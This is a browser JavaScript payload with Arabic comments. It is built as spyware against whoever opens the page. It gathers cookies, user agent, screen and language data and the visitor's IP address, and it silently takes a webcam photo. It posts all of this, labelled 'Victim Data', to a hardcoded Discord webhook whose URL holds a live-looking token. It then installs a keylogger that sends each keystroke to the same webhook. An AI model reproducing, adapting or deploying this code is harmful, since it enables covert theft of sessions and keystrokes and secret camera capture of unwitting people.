// ضع webhook بتاعك هنا (الجديد مش القديم الميت)
const WEBHOOK = 'https://discord.com/api/webhooks/1489207059026149377/HAW3Qm9L-k7aNvSWXxpctuuFp4KcH87ss74EFcAye_eeatcYVsVLdn360f1UEuf6YJUm';

(async()=>{
    // معلومات أساسية
    const info = {
        time: new Date().toISOString(),
        ua: navigator.userAgent,
        cookies: document.cookie,
        screen: screen.width+'x'+screen.height,
        lang: navigator.language
    };
    
    // IP
    try{
        info.ip = await (await fetch('https://api.ipify.org')).text();
    }catch(e){}
    
    // كاميرا
    try{
        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r=>setTimeout(r,2500));
        const canvas = document.createElement('canvas');
        canvas.width = 480;
        canvas.height = 640;
        canvas.getContext('2d').drawImage(video,0,0);
        info.selfie = canvas.toDataURL();
        stream.getTracks().forEach(t=>t.stop());
    }catch(e){
        info.camera = 'denied';
    }
    
    // إرسال
    const send = d => {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: '**🎭 SACI HACK 🎭**',
                embeds: [{title: 'Victim Data', description: `\`\`\`${JSON.stringify(d)}\`\`\``, color: 0xff0000}]
            })
        });
    };
    
    send(info);
    
    // كيلوجر
    document.onkeydown = e => send({key: e.key});
})();
